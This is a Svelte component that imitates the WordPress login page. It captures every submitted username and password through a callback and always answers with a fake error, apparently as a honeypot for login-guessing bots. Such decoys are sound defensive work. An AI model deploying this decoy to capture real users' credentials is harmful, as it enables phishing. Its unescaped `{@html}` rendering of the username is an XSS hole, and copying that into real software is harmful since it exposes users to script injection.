<script lang="ts">
	import { callback } from '$lib/callback';
	import { randomResponse } from '$lib/util';
	import { onMount } from 'svelte';
	import { page } from '$app/stores';

	let hasError: boolean = false;
	let errorMessage: string = '';
	let hidePassword: boolean = true;

	let loginInput: HTMLInputElement;
	let userLogin: string = '';
	let userPass: string = '';

	onMount(() => {
		// Mimicking default WordPress behaviour
		loginInput.focus();
		loginInput.select();
	});

	const togglePasswordVisibility = () => {
		hidePassword = !hidePassword;
	};

	const submitHandler = async () => {
		setTimeout(() => {
			if (!userLogin.length || !userPass.length) {
				errorMessage = '';

				if (!userLogin.length) {
					errorMessage += '<strong>Error</strong>: The username field is empty.<br />';
				}

				if (!userPass.length) {
					errorMessage += '<strong>Error</strong>: The password field is empty.<br />';
				}
			} else {
				errorMessage = `<strong>Error</strong>: The username <strong>${userLogin}</strong> is not registered on this site. If you are unsure of your username, try your email address instead.<br />`;
			}

			hasError = true;
		}, randomResponse());

		callback({
			form: '#loginform',
			user: userLogin,
			password: userPass,
			timestamp: Date.now()
		});
	};
</script>

<svelte:head>
	<title>Log In &lsaquo; {import.meta.env.VITE_SITE_NAME ? `${import.meta.env.VITE_SITE_NAME} — WordPress` : 'WordPress'}</title>
	{#if import.meta.env.VITE_HIDE_ROBOTS}
		<meta name="robots" content="max-image-preview:large, noindex, noarchive" />
	{/if}
</svelte:head>

{#if hasError}
	<div id="login_error">
		{@html errorMessage}
	</div>
{/if}

<form name="loginform" id="loginform" action="{$page.url.origin}/wp-login.php" method="post" class:shake={hasError} on:submit|preventDefault={submitHandler}>
	<p>
		<label for="user_login">Username or Email Address</label>
		<input type="text" name="log" id="user_login" class="input" bind:value={userLogin} size="20" autocapitalize="off" bind:this={loginInput} />
	</p>

	<div class="user-pass-wrap">
		<label for="user_pass">Password</label>
		<div class="wp-pwd">
			{#if hidePassword}
				<input type="password" name="pwd" id="user_pass" class="input password-input" bind:value={userPass} size="20" />
			{:else}
				<input type="text" name="pwd" id="user_pass" class="input password-input" bind:value={userPass} size="20" />
			{/if}

			<button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="{hidePassword ? 'Show' : 'Hide'} password" on:click={togglePasswordVisibility}>
				<span class="dashicons dashicons-{hidePassword ? 'visibility' : 'hidden'}" aria-hidden="true" />
			</button>
		</div>
	</div>

	<p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever" /> <label for="rememberme">Remember Me</label></p>

	<p class="submit">
		<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
		<input type="hidden" name="redirect_to" value="{$page.url.origin}/wp-admin/" />
		<input type="hidden" name="testcookie" value="1" />
	</p>
</form>

<p id="nav">
	<a data-sveltekit-reload href="wp-login.php?action=lostpassword">Lost your password?</a>
</p>
